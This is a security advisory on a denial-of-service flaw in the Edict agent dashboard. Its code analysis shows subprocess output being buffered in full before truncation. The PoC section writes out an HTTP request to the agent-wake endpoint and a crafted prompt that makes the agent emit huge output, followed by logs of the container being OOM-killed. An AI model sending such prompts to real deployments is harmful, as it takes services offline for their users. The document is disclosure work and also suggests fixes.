# Edict has a denial of service vulnerability due to OpenClaw/Agent subprocess output buffering

## supplier

Internal Edict agent system source package.

## affected version

Local source snapshot under:

```text
E:\agent_vul\edict-main\edict-main
```

Verified in a real local Docker deployment with a local Ollama-backed OpenClaw-compatible agent harness:

```text
Edict dashboard: http://127.0.0.1:33150
Ollama model: Qwen2.5-Coder:7B
Container memory limit: 384MiB
```

## vulnerability file

```text
dashboard/server.py
edict/backend/app/workers/dispatch_worker.py
```

## describe

Edict has a denial of service vulnerability in its OpenClaw/Agent execution path.

The dashboard and backend dispatch worker execute `openclaw agent` through `subprocess.run(..., capture_output=True, text=True)`. This buffers child-process stdout/stderr completely in the Edict process. The code truncates output only after the child process exits, so the truncation does not protect memory while output is being produced.

In a deployed agent service, a crafted prompt can induce an agent/tool to produce very large output. Edict then buffers that output before applying its small return-size truncation, which can exhaust container memory, terminate the service, and make the dashboard/API unavailable for legitimate users.

## code analysis

The dashboard wake/dispatch path runs OpenClaw with full output capture:

```python
cmd = ['openclaw', 'agent', '--agent', runtime_id, '-m', msg, '--timeout', '120']
result = subprocess.run(cmd, capture_output=True, text=True, timeout=130)
```

The automatic dispatch path has the same buffering behavior:

```python
cmd = [openclaw_bin, 'agent', '--agent', agent_id, '-m', msg, '--timeout', '300']
result = subprocess.run(cmd, capture_output=True, text=True, timeout=310)
```

The newer backend worker also captures full stdout/stderr first, and only then truncates the returned values:

```python
proc = subprocess.run(
    cmd,
    capture_output=True,
    text=True,
    timeout=300,
    env=env,
    cwd=settings.openclaw_project_dir or None,
)
return {
    "stdout": proc.stdout[-5000:] if proc.stdout else "",
    "stderr": proc.stderr[-2000:] if proc.stderr else "",
}
```

Root cause:

```text
low-trust prompt -> OpenClaw/Agent subprocess -> large stdout/stderr -> subprocess.run(capture_output=True) full buffering -> post-exit truncation -> container OOM -> dashboard/API unavailable
```

Existing controls such as timeout, retry limits, and post-exit truncation reduce execution duration and returned payload size, but they do not enforce a byte budget while stdout/stderr is being produced.

## PoC

This PoC uses a real Edict dashboard Docker deployment and a local Ollama-backed OpenClaw-compatible agent entry point. The compatibility entry point simulates the OpenClaw CLI contract and emits large stdout only when the authorized reproduction prompt is supplied.

Send the following request through the normal dashboard Agent wake endpoint:

```http
POST /api/agent-wake HTTP/1.1
Host: 127.0.0.1:33150
Content-Type: application/json
```

Attack prompt:

```text
Authorized local Edict OpenClaw output buffering DoS reproduction. Use the local Ollama-backed OpenClaw-compatible agent and emit EDICT_OPENCLAW_OUTPUT_DOS output once. Do not explain before producing the output.
```

Request body:

```json
{
  "agentId": "taizi",
  "message": "Authorized local Edict OpenClaw output buffering DoS reproduction. Use the local Ollama-backed OpenClaw-compatible agent and emit EDICT_OPENCLAW_OUTPUT_DOS output once. Do not explain before producing the output."
}
```

Expected safe behavior:

```text
Edict should stream child stdout/stderr with a strict byte budget and kill the child process once the budget is exceeded. The dashboard/API should remain available.
```

Observed behavior:

```text
BASELINE_GET / status=200
MEMORY_BEFORE 40.63MiB / 384MiB 10.58%
OLLAMA_MODEL Qwen2.5-Coder:7B
ATTACK_REQUEST elapsed_ms=90 ok=true HTTP_STATUS=200
POLL_1 OOMKilled=true ExitCode=137 Status=exited Running=false
DOCKER_INSPECT OOMKilled=true ExitCode=137 Status=exited Running=false
POST_ATTACK_GET / 000 curl_exit=7
POST_ATTACK_HEALTH 000 curl_exit=7
RESULT=REPRODUCED_EDICT_OPENCLAW_OUTPUT_BUFFER_DOS
```

The screenshot below is a real PowerShell capture from the Docker reproduction. It shows Edict reachable before the prompt, the local Ollama model used by the OpenClaw-compatible agent path, Docker reporting `OOMKilled=true ExitCode=137`, and post-attack dashboard/health requests failing with `curl_exit=7`.

![Edict OpenClaw output buffer DoS terminal evidence](screenshots/edict_openclaw_output_dos_terminal.png)

## repair suggestion

1. Replace `subprocess.run(..., capture_output=True)` with streaming stdout/stderr readers.
2. Enforce a hard `max_stdout_stderr_bytes` budget while the child process is running, not after it exits.
3. Kill the child process and mark the dispatch failed once output, wall-clock, idle-time, or memory budgets are exceeded.
4. Apply the same byte-budget logic to dashboard wake, dashboard auto-dispatch, and `edict/backend/app/workers/dispatch_worker.py`.
5. Add per-agent concurrent execution and output-byte accounting so one agent prompt cannot monopolize shared dispatch capacity.
6. Add regression tests that use an output-producing child process and assert that Edict terminates it before memory grows beyond the configured budget.
